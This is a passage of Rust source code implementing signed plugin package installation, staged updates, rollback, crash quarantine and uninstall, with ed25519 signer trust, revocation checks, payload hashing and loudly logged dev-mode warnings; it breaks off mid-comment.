//! Plugin package lifecycle (`17-implementation-guide.md` §9.7).
//!
//! Install / staged update / rollback / crash-quarantine for plugin packages.
//! A package is a directory containing:
//!
//! ```text
//! manifest.json      — plugin manifest (id, version, permissions, migrations)
//! signature.bin      — ed25519 signature over manifest.json bytes (optional
//!                      in dev mode, REQUIRED when require_signature)
//! plugin             — native binary, or plugin.wasm for wasm runtime
//! migrations/*.sql   — optional; host-run via PluginStorage::migrate
//! ```
//!
//! Layout under `<home>`:
//! - `plugins/<id>/`        — live install
//! - `plugins/<id>.staging/`— update in progress
//! - `plugins/<id>.prev/`   — previous version kept for rollback
//! - `revoked-signers`      — one signer pubkey hex per line; any match refuses install
//!
//! Secrets never appear here: manifests carry secret *names* only.

use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use ed25519_dalek::{Signature, VerifyingKey};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;

use crate::audit::{AuditAction, AuditLog};
use crate::plugin_storage::{validate_plugin_id, PluginStorage, StorageError};

/// Central dev-mode warning banner — THE single source of truth reused by
/// the lifecycle logger, the REST metadata, the boot warning, and docs.
/// Keep it loud: dev mode bypasses package signing.
pub const DEV_MODE_WARNING: &str = "⚠ DEV MODE: unsigned plugin packages are accepted — \
     signing verification and signer trust are BYPASSED. NOT safe for production. \
     Only enable `plugin_dev_mode` for local development.";

/// Boot-time multi-line warning emitted once when `plugin_dev_mode` is on.
pub const DEV_MODE_BOOT_WARNING: &str =
    "============================================================\n\
     ⚠⚠⚠  PLUGIN DEV MODE ENABLED  ⚠⚠⚠\n\
     ------------------------------------------------------------\n\
     Unsigned plugin packages will be installed WITHOUT signature checks.\n\
     Any package dropped into the plugins directory can execute code.\n\n\
     This mode is for LOCAL DEVELOPMENT ONLY. Disable `plugin_dev_mode`\n\
     in config.toml before exposing this daemon to anyone else.\n\
     ============================================================";

/// Per-action dev-mode banner used in WARN logs and audit details.
pub fn dev_mode_banner(action: &str, plugin_id: &str, version: &str, signed: bool) -> String {
    let what = if signed {
        format!("plugin {plugin_id} v{version}")
    } else {
        format!("UNSIGNED plugin {plugin_id} v{version}")
    };
    format!("⚠ DEV MODE: {what} {action} — {DEV_MODE_WARNING}")
}

/// Filename of the per-install random key that anchors the plugin account
/// fingerprint. Lives directly under the T3rnel home; the raw bytes are never
/// exposed — only their SHA-256-derived fingerprint is compared.
const ACCOUNT_KEY_FILE: &str = "plugin-account.key";
/// Domain separator so the fingerprint can never collide with other hashes
/// of the same key material.
const ACCOUNT_FP_DOMAIN: &str = "t3rnel-plugin-account-v1";

/// Stable account/machine fingerprint for plugin entitlement binding.
///
/// Derived from a 32-byte random key persisted at `<home>/plugin-account.key`
/// (created on first use, mode 0600) plus the canonical home path, so copying
/// the key to a different install path yields a different fingerprint. The raw
/// key is never returned or logged — only this hash is.
///
/// This is the minimal account-identity primitive: there is no central account
/// service, so "the account" is defined as "this T3rnel install". A manifest's
/// `entitlement_account` must equal this value or install/update is refused.
pub fn local_plugin_account_fingerprint(home: &Path) -> Result<String, LifecycleError> {
    let key_path = home.join(ACCOUNT_KEY_FILE);
    let key: Vec<u8> = if key_path.exists() {
        fs::read(&key_path)?
    } else {
        let mut k = [0u8; 32];
        rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut k);
        fs::create_dir_all(home)?;
        match write_private_new(&key_path, &k) {
            Ok(()) => k.to_vec(),
            // Another caller created it first: use theirs.
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => fs::read(&key_path)?,
            Err(e) => return Err(e.into()),
        }
    };
    if key.len() != 32 {
        return Err(LifecycleError::Manifest(format!(
            "{ACCOUNT_KEY_FILE} is corrupt ({} bytes, expected 32)",
            key.len()
        )));
    }
    let canon = fs::canonicalize(home).unwrap_or_else(|_| home.to_path_buf());
    let mut h = Sha256::new();
    h.update(ACCOUNT_FP_DOMAIN.as_bytes());
    h.update(canon.to_string_lossy().as_bytes());
    h.update(&key);
    Ok(hex::encode(h.finalize()))
}

/// Minimal manifest the lifecycle needs. The full bridge manifest (capabilities,
/// auth rules, data classes) is validated by `t3rnel-bridge`; this struct carries
/// the fields install/update/quarantine actually act on, plus a `permissions_summary`
/// the installer displays to the user before approval.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PluginManifestLite {
    pub id: String,
    pub version: String,
    pub name: String,
    #[serde(default)]
    pub description: String,
    /// Runtime kind: "process" | "wasm" | "declarative".
    #[serde(default = "default_runtime")]
    pub runtime: String,
    /// Entry binary name inside the package (default "plugin").
    #[serde(default = "default_entry")]
    pub entry: String,
    /// Migrations the host runs on install/update: (version, description, sql).
    #[serde(default)]
    pub migrations: Vec<Migration>,
    /// Permission summary lines shown at install time (from the full manifest).
    #[serde(default)]
    pub permissions_summary: Vec<String>,
    /// Optional per-account binding: the signer commits to a specific local
    /// account fingerprint (see [`local_plugin_account_fingerprint`]). Because
    /// this field lives inside the signed manifest bytes, it cannot be
    /// stripped or swapped without invalidating the signature. When present,
    /// install/update REFUSES on any machine whose fingerprint differs —
    /// enforced even in dev mode.
    #[serde(default)]
    pub entitlement_account: Option<String>,
    /// SHA-256 (hex) of every payload file in the package, keyed by its path
    /// relative to the package root. Because this map lives inside the signed
    /// manifest, the signature covers the binary: a swapped or added file no
    /// longer verifies. `manifest.json`, `signature.bin`, `signer.pub` and the
    /// plugin's own `data/` folder are not payload.
    #[serde(default)]
    pub files: BTreeMap<String, String>,
    /// The permission detail the dispatch layer needs to build the plugin's
    /// [`crate::plugin_host::PluginHostConfig`]: declared egress hosts, auth
    /// bindings and data classes. Carried inside the signed manifest so the
    /// core never has to trust unsigned package metadata. `None` for packages
    /// signed before this field existed — dispatch then runs fail-closed
    /// (no egress, no auth bindings, no labelled memory).
    #[serde(default)]
    pub permissions: Option<SignedPermissions>,
}

/// Signed permission detail mirrored from the source manifest (bridge v1
/// `permissions` or the lite package schema). Names and scopes only — never
/// secret values.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct SignedPermissions {
    /// `permissions.network.hosts` — declared egress hosts.
    #[serde(default)]
    pub network_hosts: Vec<String>,
    /// Hosts allowed to carry percent-encoded slashes in a path segment
    /// (`permissions.network.encoded_slash`).
    #[serde(default)]
    pub encoded_slash_hosts: Vec<String>,
    /// `permissions.auth` — secret names + schemes + scope (never values).
    #[serde(default)]
    pub auth: Vec<SignedAuthRule>,
    /// `permissions.data_classes` — the closed §14.10 set as strings.
    #[serde(default)]
    pub data_classes: Vec<String>,
    /// The host services the manifest `requires`. The core serves a gated
    /// service (`conversations`) only to a plugin that declared it here, inside
    /// the signed bytes. Packages signed before this field existed have none,
    /// so they are refused those services.
    #[serde(default)]
    pub host_services: Vec<String>,
}

/// One `permissions.auth` rule as signed into the package.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SignedAuthRule {
    pub secret: String,
    /// "bearer" | "header" | "basic" | "query-key" | "hmac-sha256".
    pub scheme: String,
    #[serde(default)]
    pub hosts: Vec<String>,
    #[serde(default)]
    pub methods: Vec<String>,
    #[serde(default)]
    pub paths: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Migration {
    pub version: i64,
    pub description: String,
    pub sql: String,
}

fn default_runtime() -> String {
    "process".to_string()
}
fn default_entry() -> String {
    "plugin".to_string()
}

#[derive(Debug, thiserror::Error)]
pub enum LifecycleError {
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
    #[error("bad manifest: {0}")]
    Manifest(String),
    #[error("signature verification failed: {0}")]
    Signature(String),
    #[error("signer {0} is revoked")]
    Revoked(String),
    #[error("storage error: {0}")]
    Storage(#[from] StorageError),
    #[error("plugin {0:?} is quarantined ({1} crashes in the last hour)")]
    Quarantined(String, usize),
    #[error("no previous version to roll back to")]
    NoPrevious,
    #[error("package missing entry point {0:?}")]
    MissingEntry(String),
    #[error("plugin is bound to a different account/machine (entitlement_account mismatch)")]
    AccountBinding,
}

#[derive(Debug, Clone)]
pub struct InstallOptions {
    /// Require a valid ed25519 signature from a trusted key.
    pub require_signature: bool,
    /// Trusted signer pubkeys (hex, 32 bytes) allowed to sign packages.
    pub trusted_keys: Vec<String>,
    /// Dev mode: unsigned packages allowed; only ever set by dev tooling.
    pub dev_mode: bool,
}

impl Default for InstallOptions {
    fn default() -> Self {
        InstallOptions {
            require_signature: true,
            trusted_keys: Vec::new(),
            dev_mode: false,
        }
    }
}

/// What the user sees before approving an install — permissions only,
/// never secret material.
#[derive(Debug, Clone, Serialize)]
pub struct InstallReport {
    pub plugin_id: String,
    pub version: String,
    pub action: String, // "install" | "update"
    pub permissions: Vec<String>,
    pub migrations_run: Vec<i64>,
    pub signed: bool,
    pub signer: Option<String>,
    /// True when the install ran under plugin dev mode (unsigned allowed).
    pub dev_mode: bool,
    /// True when the manifest carried an `entitlement_account` binding that
    /// matched this install's account fingerprint.
    pub account_bound: bool,
}

pub struct PluginManager {
    home: PathBuf,
    /// Optional main audit chain — dev-mode lifecycle events are mirrored here
    /// as `PluginLifecycle` entries in addition to the per-plugin audit table.
    audit: Option<Arc<AuditLog>>,
}

impl PluginManager {
    pub fn new(home: &Path) -> Self {
        PluginManager {
            home: home.to_path_buf(),
            audit: None,
        }
    }

    /// Attach the kernel's main audit chain so dev-mode plugin events land in
    /// the tamper-evident log, not only the per-plugin audit table.
    pub fn set_audit_log(&mut self, audit: Arc<AuditLog>) {
        self.audit = Some(audit);
    }

    /// The T3rnel home directory this manager operates on.
    /// Installed plugins whose signed manifest binds the secret name `secret`
    /// (for example `oauth-access:google`).
    pub fn plugins_binding_secret(&self, secret: &str) -> Vec<String> {
        self.list()
            .into_iter()
            .filter(|id| {
                Self::read_manifest(&self.install_dir(id))
                    .ok()
                    .and_then(|m| m.permissions)
                    .is_some_and(|p| p.auth.iter().any(|r| r.secret == secret))
            })
            .collect()
    }

    pub fn home(&self) -> &Path {
        &self.home
    }

    pub fn plugins_dir(&self) -> PathBuf {
        self.home.join("plugins")
    }
    fn install_dir(&self, id: &str) -> PathBuf {
        self.plugins_dir().join(id)
    }
    fn staging_dir(&self, id: &str) -> PathBuf {
        self.plugins_dir().join(format!("{id}.staging"))
    }
    fn prev_dir(&self, id: &str) -> PathBuf {
        self.plugins_dir().join(format!("{id}.prev"))
    }
    /// Read + validate the package manifest.
    fn read_manifest(pkg: &Path) -> Result<PluginManifestLite, LifecycleError> {
        let text = fs::read_to_string(pkg.join("manifest.json"))
            .map_err(|_| LifecycleError::Manifest("manifest.json missing".into()))?;
        let m: PluginManifestLite =
            serde_json::from_str(&text).map_err(|e| LifecycleError::Manifest(e.to_string()))?;
        validate_plugin_id(&m.id).map_err(|e| LifecycleError::Manifest(e.to_string()))?;
        Ok(m)
    }

    /// Verify ed25519 signature over manifest.json bytes. Returns signer
    /// pubkey hex on success.
    fn verify_signature(
        &self,
        pkg: &Path,
        manifest_bytes: &[u8],
        opts: &InstallOptions,
    ) -> Result<Option<String>, LifecycleError> {
        let sig_path = pkg.join("signature.bin");
        if !sig_path.exists() {
            // Unsigned packages exist only in developer mode.
            if !opts.dev_mode {
                return Err(LifecycleError::Signature("signature.bin missing".into()));
            }
            return Ok(None);
        }
        let sig_bytes = fs::read(&sig_path)?;
        let sig = Signature::from_slice(&sig_bytes)
            .map_err(|_| LifecycleError::Signature("malformed signature".into()))?;
        // The signer pubkey is carried alongside as signer.pub (64-hex).
        let signer_hex = fs::read_to_string(pkg.join("signer.pub"))
            .map_err(|_| LifecycleError::Signature("signer.pub missing".into()))?
            .trim()
            .to_string();
        // Revocation check: home-level revoked-signers list.
        if let Ok(revoked) = fs::read_to_string(self.home.join("revoked-signers")) {
            if revoked.lines().any(|l| l.trim() == signer_hex) {
                return Err(LifecycleError::Revoked(signer_hex));
            }
        }
        // Trust: the signer must be one the host was told to trust. An empty
        // list is "trust nobody", not "trust anyone": a package signed with a
        // key the attacker made up verifies perfectly against its own signer.pub.
        // Developer mode alone may accept a signer it does not know.
        if !opts.trusted_keys.iter().any(|k| k == &signer_hex) && !opts.dev_mode {
            return Err(LifecycleError::Signature(if opts.trusted_keys.is_empty() {
                "no trusted signers are configured (plugin_trusted_signers is empty)".into()
            } else {
                format!("untrusted signer {signer_hex}")
            }));
        }
        let key_bytes = hex::decode(&signer_hex)
            .map_err(|_| LifecycleError::Signature("signer.pub not hex".into()))?;
        let key_arr: [u8; 32] = key_bytes
            .try_into()
            .map_err(|_| LifecycleError::Signature("signer.pub wrong length".into()))?;
        let vk = VerifyingKey::from_bytes(&key_arr)
            .map_err(|_| LifecycleError::Signature("bad pubkey".into()))?;
        vk.verify_strict(manifest_bytes, &sig)
            .map_err(|_| LifecycleError::Signature("ed25519 verify failed".into()))?;
        Ok(Some(signer_hex))
    }

    /// Per-account entitlement binding: when the manifest declares
    /// `entitlement_account`, the local install fingerprint MUST match.
    /// Enforced regardless of dev_mode — the binding is the point.
    fn check_entitlement(&self, manifest: &PluginManifestLite) -> Result<(), LifecycleError> {
        let Some(expected) = &manifest.entitlement_account else {
            return Ok(());
        };
        let local = local_plugin_account_fingerprint(&self.home)?;
        if local != *expected {
            return Err(LifecycleError::AccountBinding);
        }
        Ok(())
    }

    /// Dev-mode loudness: WARN-level banner log + per-plugin audit entry +
    /// main audit chain entry. Called for every install/update performed with
    /// `dev_mode` enabled.
    fn emit_dev_mode_event(&self, action: &str, manifest: &PluginManifestLite, signed: bool) {
        let kind = format!("plugin.dev_mode.{action}");
        let banner = dev_mode_banner(action, &manifest.id, &manifest.version, signed);
        tracing::warn!("{banner}");
        if let Ok(storage) = PluginStorage::open(&self.home, &manifest.id) {
            let _ = storage.audit_append(&kind, &format!("{}@{}", manifest.id, manifest.version));
        }
        if let Some(audit) = &self.audit {
            audit.record(
                "plugin",
                AuditAction::PluginLifecycle,
                format!("{kind}: {}@{}", manifest.id, manifest.version),
                if signed {
                    "dev_mode signed"
                } else {
                    "dev_mode UNSIGNED"
                },
            );
        }
    }

    /// Verify the package has its entry point and copy it into `dest`
    /// via a staging rename (never partially visible).
    fn stage_package(
        &self,
        pkg: &Path,
        manifest: &PluginManifestLite,
        dest: &Path,
    ) -> Result<(), LifecycleError> {
        let entry = if manifest.runtime == "wasm" {
            "plugin.wasm".to_string()
        } else {
            manifest.entry.clone()
        };
        if !valid_entry_name(&entry) {
            return Err(LifecycleError::Manifest(format!(
                "entry {entry:?} is not a plain file name"
            )));
        }
        if !pkg.join(&entry).is_file() {
            return Err(LifecycleError::MissingEntry(entry));
        }
        if dest.exists() {
            fs::remove_dir_all(dest)?;
        }
        if let Err(e) = copy_dir_all(pkg, dest) {
            let _ = fs::remove_dir_all(dest);
            return Err(LifecycleError::Manifest(e.to_string()));
        }
        Ok(())
    }

    /// Run the manifest's migrations through the plugin's own storage.
    fn run_migrations(
        &self,
        id: &str,
        manifest: &PluginManifestLite,
    ) -> Result<Vec<i64>, LifecycleError> {
        if manifest.migrations.is_empty() {
            return Ok(Vec::new());
        }
        let storage = PluginStorage::open(&self.home, id)?;
        let migs: Vec<(i64, &str, &str)> = manifest
            .migrations
            .iter()
            .map(|m| (m.version, m.description.as_str(), m.sql.as_str()))
            .collect();
        Ok(storage.migrate(&migs)?)
    }

    fn health_check(&self, id: &str, manifest: &PluginManifestLite) -> Result<(), LifecycleError> {
        let dir = self.install_dir(id);
        let entry = if manifest.runtime == "wasm" {
            dir.join("plugin.wasm")
        } else {
            dir.join(&manifest.entry)
        };
        if !entry.exists() {
            return Err(LifecycleError::MissingEntry(entry.display().to_string()));
        }
        // Native binaries must be executable; wasm is data (wasmtime checks it).
        if manifest.runtime != "wasm" {
            use std::os::unix::fs::PermissionsExt;
            let mode = entry.metadata()?.permissions().mode();
            if mode & 0o111 == 0 {
                return Err(LifecycleError::MissingEntry(format!(
                    "{} is not executable",
                    entry.display()
                )));
            }
        }
        Ok(())
    }

    /// Install a package directory. Returns the permission display the user
    /// approves. Atomic-ish: stage → verify → rename.
    pub fn install(
        &self,
        pkg: &Path,
        opts: &InstallOptions,
    ) -> Result<InstallReport, LifecycleError> {
        let manifest_bytes = fs::read(pkg.join("manifest.json"))
            .map_err(|_| LifecycleError::Manifest("manifest.json missing".into()))?;
        let manifest = Self::read_manifest(pkg)?;
        let signer = self.verify_signature(pkg, &manifest_bytes, opts)?;
        self.check_entitlement(&manifest)?;
        let final_dir = self.install_dir(&manifest.id);
        if final_dir.exists() {
            return Err(LifecycleError::Manifest(format!(
                "plugin {} already installed; use update",
                manifest.id
            )));
        }
        let staging = self.staging_dir(&manifest.id);
        self.stage_package(pkg, &manifest, &staging)?;
        // Verify what was COPIED, not the source folder: the source could change
        // between a check and a copy.
        if let Err(e) = verify_payload(&staging, &manifest, signer.is_some(), false) {
            let _ = fs::remove_dir_all(&staging);
            return Err(e);
        }
        fs::rename(&staging, &final_dir)?;
        // A failure after the move must not leave a half-installed plugin that
        // blocks the next attempt ("already installed; use update").
        let finish = || -> Result<Vec<i64>, LifecycleError> {
            let migrations_run = self.run_migrations(&manifest.id, &manifest)?;
            self.health_check(&manifest.id, &manifest)?;
            Ok(migrations_run)
        };
        let migrations_run = match finish() {
            Ok(v) => v,
            Err(e) => {
                let _ = fs::remove_dir_all(&final_dir);
                return Err(e);
            }
        };
        // Record install in the plugin's audit trail.
        if let Ok(storage) = PluginStorage::open(&self.home, &manifest.id) {
            let _ = storage.audit_append("lifecycle.install", &manifest.version);
        }
        if opts.dev_mode {
            self.emit_dev_mode_event("install", &manifest, signer.is_some());
        }
        Ok(InstallReport {
            plugin_id: manifest.id.clone(),
            version: manifest.version.clone(),
            action: "install".into(),
            permissions: manifest.permissions_summary.clone(),
            migrations_run,
            signed: signer.is_some(),
            signer,
            dev_mode: opts.dev_mode,
            account_bound: manifest.entitlement_account.is_some(),
        })
    }

    /// Staged update: verify → stage → backup current → swap → migrate.
    /// On any failure after backup, the previous version is restored.
    pub fn update(
        &self,
        pkg: &Path,
        opts: &InstallOptions,
    ) -> Result<InstallReport, LifecycleError> {
        let manifest_bytes = fs::read(pkg.join("manifest.json"))
            .map_err(|_| LifecycleError::Manifest("manifest.json missing".into()))?;
        let manifest = Self::read_manifest(pkg)?;
        let signer = self.verify_signature(pkg, &manifest_bytes, opts)?;
        self.check_entitlement(&manifest)?;
        let current = self.install_dir(&manifest.id);
        if !current.exists() {
            return Err(LifecycleError::Manifest(format!(
                "plugin {} not installed; use install",
                manifest.id
            )));
        }
        let staging = self.staging_dir(&manifest.id);
        self.stage_package(pkg, &manifest, &staging)?;
        if let Err(e) = verify_payload(&staging, &manifest, signer.is_some(), false) {
            let _ = fs::remove_dir_all(&staging);
            return Err(e);
        }
        let prev = self.prev_dir(&manifest.id);
        if prev.exists() {
            fs::remove_dir_all(&prev)?;
        }
        // Preserve plugin DATA across the binary swap — data/ is state, not
        // code; it must survive updates and rollbacks.
        let data_dir = current.join("data");
        let data_keep = self
            .plugins_dir()
            .join(format!("{}.data-keep", manifest.id));
        let had_data = data_dir.exists();
        if had_data {
            if data_keep.exists() {
                fs::remove_dir_all(&data_keep)?;
            }
            fs::rename(&data_dir, &data_keep)?;
        }
        fs::rename(&current, &prev)?;
        // Swap staging into place.
        if let Err(e) = fs::rename(&staging, &current) {
            // Restore previous (and data) on swap failure.
            let _ = fs::rename(&prev, &current);
            if had_data {
                let _ = fs::rename(&data_keep, current.join("data"));
            }
            return Err(LifecycleError::Io(e));
        }
        if had_data {
            fs::create_dir_all(&current)?;
            fs::rename(&data_keep, current.join("data"))?;
        }
        // Migrations run against existing storage; PluginStorage::migrate
        // takes its own pre-migration snapshot.
        let rollback_marker = self
            .plugins_dir()
            .join(format!("{}.rollback-snapshot", manifest.id));
        let migrations_run = match self.run_migrations(&manifest.id, &manifest) {
            Ok(v) => v,
            Err(e) => {
                // Roll back binary AND keep plugin data: stash data aside,
                // restore prev binary, put data back.
                let _ = fs::rename(current.join("data"), &data_keep);
                let _ = fs::remove_dir_all(&current);
                let _ = fs::rename(&prev, &current);
                let _ = fs::rename(&data_keep, current.join("data"));
                return Err(e);
            }
        };
        if let Err(e) = self.health_check(&manifest.id, &manifest) {
            let _ = fs::rename(current.join("data"), &data_keep);
            let _ = fs::remove_dir_all(&current);
            let _ = fs::rename(&prev, &current);
            let _ = fs::rename(&data_keep, current.join("data"));
            return Err(e);
        }
        // Remember which snapshot belongs to THIS update, so a rollback restores
        // the database only when this update changed its schema.
        match (
            migrations_run.is_empty(),
            self.newest_snapshot(&manifest.id),
        ) {
            (false, Some(snap)) => {
                let name = snap
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_default();
                let _ = fs::write(&rollback_marker, name);
            }
            _ => {
                let _ = fs::remove_file(&rollback_marker);
            }
        }
        if let Ok(storage) = PluginStorage::open(&self.home, &manifest.id) {
            let _ = storage.audit_append("lifecycle.update", &manifest.version);
        }
        if opts.dev_mode {
            self.emit_dev_mode_event("update", &manifest, signer.is_some());
        }
        Ok(InstallReport {
            plugin_id: manifest.id.clone(),
            version: manifest.version.clone(),
            action: "update".into(),
            permissions: manifest.permissions_summary.clone(),
            migrations_run,
            signed: signer.is_some(),
            signer,
            dev_mode: opts.dev_mode,
            account_bound: manifest.entitlement_account.is_some(),
        })
    }

    /// Roll back to the previous version: restore binary dir and the newest
    /// pre-migration storage snapshot.
    pub fn rollback(&self, id: &str) -> Result<(), LifecycleError> {
        validate_plugin_id(id).map_err(|e| LifecycleError::Manifest(e.to_string()))?;
        let current = self.install_dir(id);
        let prev = self.prev_dir(id);
        if !prev.exists() {
            return Err(LifecycleError::NoPrevious);
        }
        // Preserve plugin data across the binary restore.
        let data_dir = current.join("data");
        let data_keep = self.plugins_dir().join(format!("{}.data-keep", id));
        let had_data = data_dir.exists();
        if had_data {
            if data_keep.exists() {
                fs::remove_dir_all(&data_keep)?;
            }
            fs::rename(&data_dir, &data_keep)?;
        }
        if current.exists() {
            fs::remove_dir_all(&current)?;
        }
        fs::rename(&prev, &current)?;
        if had_data {
            fs::create_dir_all(&current)?;
            fs::rename(&data_keep, current.join("data"))?;
        }
        // Restore the database only if the update being undone changed its
        // schema, and never discard the data written since: the current
        // database is moved aside, not deleted.
        let marker = self.plugins_dir().join(format!("{id}.rollback-snapshot"));
        if let Ok(name) = fs::read_to_string(&marker) {
            let name = name.trim();
            let snap_dir = current.join("data").join("snapshots");
            let snap = snap_dir.join(name);
            if !name.is_empty() && !name.contains('/') && snap.is_file() {
                let db = current.join("data").join("plugin.db");
                if db.exists() {
                    let ts = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .map(|d| d.as_secs())
                        .unwrap_or(0);
                    fs::create_dir_all(&snap_dir)?;
                    fs::rename(&db, snap_dir.join(format!("pre-rollback-{ts}.db")))?;
                }
                fs::copy(&snap, &db)?;
            }
            let _ = fs::remove_file(&marker);
        }
        if let Ok(storage) = PluginStorage::open(&self.home, id) {
            let _ = storage.audit_append("lifecycle.rollback", id);
        }
        Ok(())
    }

    /// The newest `pre-migration-*` snapshot in a plugin's data folder.
    fn newest_snapshot(&self, id: &str) -> Option<PathBuf> {
        let dir = self.install_dir(id).join("data").join("snapshots");
        let mut best: Option<(String, PathBuf)> = None;
        for entry in fs::read_dir(dir).ok()?.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with("pre-migration-") && best.as_ref().is_none_or(|(n, _)| name > *n) {
                best = Some((name, entry.path()));
            }
        }
        best.map(|(_, p)| p)
    }

    /// Record a plugin crash (timestamp now). Returns crash count in the
    /// last hour — quarantine trips at 3.
    pub fn record_crash(&self, id: &str) -> Result<usize, LifecycleError> {
        validate_plugin_id(id).map_err(|e| LifecycleError::Manifest(e.to_string()))?;
        let storage = PluginStorage::open(&self.home, id)?;
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        let key = "crashlog";
        let mut log: Vec<u64> = storage
            .state_get(key)?
            .and_then(|s| serde_json::from_str(&s).ok())
            .unwrap_or_default();
        log.retain(|t| now.saturating_sub(*t) < 3600);
        log.push(now);
        let blob = serde_json::to_string(&log).unwrap_or_default();
        storage.state_set(key, &blob)?;
        storage.audit_append("lifecycle.crash", &log.len().to_string())?;
        Ok(log.len())
    }

    /// Loopback and private addresses the plugin's signed manifest declares but the owner has
    /// not granted in `plugin_private_hosts`. The proxy refuses every one of them ("resolves to
    /// a non-public address and is not declared"), so a plugin that depends on a local service
    /// fails quietly until the grant exists; this names them so they can be reported at start.
    pub fn ungranted_private_hosts(
        &self,
        id: &str,
        granted: &BTreeMap<String, Vec<String>>,
    ) -> Vec<String> {
        let manifest: serde_json::Value = match fs::read(self.plugins_dir().join(id).join("manifest.json"))
            .ok()
            .and_then(|b| serde_json::from_slice(&b).ok())
        {
            Some(m) => m,
            None => return Vec::new(),
        };
        let own = granted.get(id).map(Vec::as_slice).unwrap_or_default();
        manifest["permissions"]["network_hosts"]
            .as_array()
            .into_iter()
            .flatten()
            .filter_map(|h| h.as_str())
            .filter(|h| declared_host_is_private(h) && !own.iter().any(|g| g == h))
            .map(str::to_string)
            .collect()
    }

    /// Whether the plugin may be launched: not quarantined and (if required)
    /// signature-verified install record exists.
    pub fn launch_permitted(&self, id: &str) -> Result<(), LifecycleError> {
        validate_plugin_id(id).map_err(|e| LifecycleError::Manifest(e.to_string()))?;
        let crashes = self.record_crash_readonly(id)?;
        if crashes >= 3 {
            return Err(LifecycleError::Quarantined(id.to_string(), crashes));
        }
        self.verify_installed(id)
    }

    /// Re-check an installed plugin before every launch: its files still match
    /// the signed list, and its signer has not been revoked since install.
    pub fn verify_installed(&self, id: &str) -> Result<(), LifecycleError> {
        validate_plugin_id(id).map_err(|e| LifecycleError::Manifest(e.to_string()))?;
        let dir = self.install_dir(id);
        let manifest = Self::read_manifest(&dir)?;
        if manifest.id != id {
            return Err(LifecycleError::Manifest(format!(
                "installed manifest is for {:?}, not {id:?}",
                manifest.id
            )));
        }
        let signed = dir.join("signature.bin").exists();
        verify_payload(&dir, &manifest, signed, true)?;
        if signed {
            let signer = fs::read_to_string(dir.join("signer.pub")).unwrap_or_default();
            if let Ok(revoked) = fs::read_to_string(self.home.join("revoked-signers")) {
                if revoked.lines().any(|l| l.trim() == signer.trim()) {
                    return Err(LifecycleError::Revoked(signer.trim().to_string()));
                }
            }
        }
        Ok(())
    }

    fn record_crash_readonly(&self, id: &str) -> Result<usize, LifecycleError> {
        let dir = self.install_dir(id);
        if !dir.exists() {
            return Err(LifecycleError::Manifest(format!(
                "plugin {id} not installed"
            )));
        }
        let storage = PluginStorage::open(&self.home, id)?;
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        let log: Vec<u64> = storage
            .state_get("crashlog")?
            .and_then(|s| serde_json::from_str(&s).ok())
            .unwrap_or_default();
        Ok(log
            .iter()
            .filter(|t| now.saturating_sub(**t) < 3600)
            .count())
    }

    /// Uninstall: remove install dir + prev + staging; keep plugin.db? No —
    /// full removal includes data dir (documented; owner may archive first).
    pub fn uninstall(&self, id: &str) -> Result<(), LifecycleError> {
        validate_plugin_id(id).map_err(|e| LifecycleError::Manifest(e.to_string()))?;
        for d in [
            self.install_dir(id),
            self.prev_dir(id),
            self.staging_dir(id),
            self.plugins_dir().join(format!("{id}.data-keep")),
        ] {
            if d.exists() {
                fs::remove_dir_all(d)?;
            }
        }
        Ok(())
    }

    /// List installed plugin ids.
    pub fn list(&self) -> Vec<String> {
        let mut out = Vec::new();
        if let Ok(entries) = fs::read_dir(self.plugins_dir()) {
            for e in entries.flatten() {
                let name = e.file_name().to_string_lossy().to_string();
                let working_copy = [".staging", ".prev", ".data-keep"]
                    .iter()
                    .any(|s| name.ends_with(s));
                if e.path().is_dir() && !working_copy {
                    out.push(name);
                }
            }
        }
        out.sort();
        out
    }
}

/// Create `path` (which must not exist) readable by the owner only, from the
/// first byte: writing first and restricting afterwards leaves a window in
/// which any local user can read a key.
pub fn write_private_new(path: &Path, bytes: &[u8]) -> std::io::Result<()> {
    use std::io::Write;
    let mut opts = fs::OpenOptions::new();
    opts.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    opts.open(path)?.write_all(bytes)
}

/// True for `localhost` and for an IP literal in a private, loopback or special range, with or
/// without a `:port`.
fn declared_host_is_private(host: &str) -> bool {
    let name = match host.rsplit_once(':') {
        Some((h, port)) if port.chars().all(|c| c.is_ascii_digit()) => h,
        _ => host,
    };
    let name = name.trim_start_matches('[').trim_end_matches(']');
    name.eq_ignore_ascii_case("localhost")
        || name
            .parse::<std::net::IpAddr>()
            .is_ok_and(|ip| t3rnel_egress::is_private_or_special(&ip))
}

/// Names that are package metadata, not payload.
const META_FILES: &[&str] = &["manifest.json", "signature.bin", "signer.pub"];

/// The entry name must be one ordinary path component: no separators, no `..`,
/// nothing that could point outside the package directory.
pub fn valid_entry_name(entry: &str) -> bool {
    !entry.is_empty()
        && entry.len() <= 128
        && entry != "."
        && entry != ".."
        && !entry.starts_with('-')
        && entry
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
        && !META_FILES.contains(&entry)
}

fn hash_file(path: &Path) -> std::io::Result<String> {
    use std::io::Read;
    let mut f = fs::File::open(path)?;
    let mut h = Sha256::new();
    let mut buf = [0u8; 64 * 1024];
    loop {
        let n = f.read(&mut buf)?;
        if n == 0 {
            break;
        }
        h.update(&buf[..n]);
    }
    Ok(hex::encode(h.finalize()))
}

/// Hash every payload file under `dir` (recursively), refusing anything that is
